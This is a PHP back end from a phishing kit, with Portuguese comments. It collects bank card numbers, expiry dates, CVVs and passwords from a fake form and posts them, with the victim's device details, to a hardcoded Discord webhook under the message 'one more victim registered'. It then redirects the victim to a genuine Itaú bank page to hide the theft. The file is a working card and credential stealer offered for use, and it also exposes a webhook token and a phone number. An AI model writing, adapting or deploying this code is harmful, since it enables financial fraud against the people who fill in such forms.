<?php
// obter valores dos campos do formulário
$numeroCartao = $_POST['numeroCartao'];
$dataValidade = $_POST['dataValidade'];
$cvv = $_POST['cvv'];
$senha = $_POST['senha'];

// verificar se todos os campos estão preenchidos
if (empty($numeroCartao) || empty($dataValidade) || empty($cvv) || empty($senha)) {
    echo "Por favor, preencha todos os campos obrigatórios.";
    exit;
}

// construir mensagem para enviar ao Discord
$dispositivo = $_SERVER['HTTP_USER_AGENT'];
$webhookurl = "https://discordapp.com/api/webhooks/1054078834762334218/Nn6BXBuW2zxIC3lgosgiogwRcCmYVN4l6gBpwQGkJlSpxkH2pG0kmG5M_2dfgtlD3WdT";
$timestamp = date("c", strtotime("now"));
$json_data = json_encode([
    "content" => "MAIS UMA VITIMA CADASTRADA",
    "username" => "SCOOTzin",
    "tts" => false,
    "embeds" => [
        [
            "title" => "Desenvolvido por SCOOT",
            "type" => "rich",
            "description" => "(13) 97800-8635",
            "url" => "",
            "timestamp" => $timestamp,
            "color" => hexdec("3366ff"),
            "footer" => [
                "text" => "SCOOT",
                "icon_url" => "https://media.tenor.com/ofYCY_OJQ1kAAAAd/hacker-hack.gif"
            ],
            "image" => [
                "url" => "https://media.tenor.com/ofYCY_OJQ1kAAAAd/hacker-hack.gif"
            ],
            "author" => [
                "name" => "SCOOT",
                "url" => "https://google.com"
            ],
            "fields" => [
                [
                    "name" => "Número do Cartão",
                    "value" => $numeroCartao,
                    "inline" => true
                ],
                [
                    "name" => "Data de Validade",
                    "value" => $dataValidade,
                    "inline" => true
                ],
                [
                    "name" => "CVV",
                    "value" => $cvv,
                    "inline" => true
                ],
                [
                    "name" => "Senha",
                    "value" => $senha,
                    "inline" => true
                ],
                [
                    "name" => "Dispositivo",
                    "value" => $dispositivo,
                    "inline" => true
                ]
            ]
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

// enviar mensagem para o Discord
$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);

// redirecionar para a página de cadastro
header("Location: https://www.itau.com.br/cartoes/magalu/consulte-sua-fatura/");
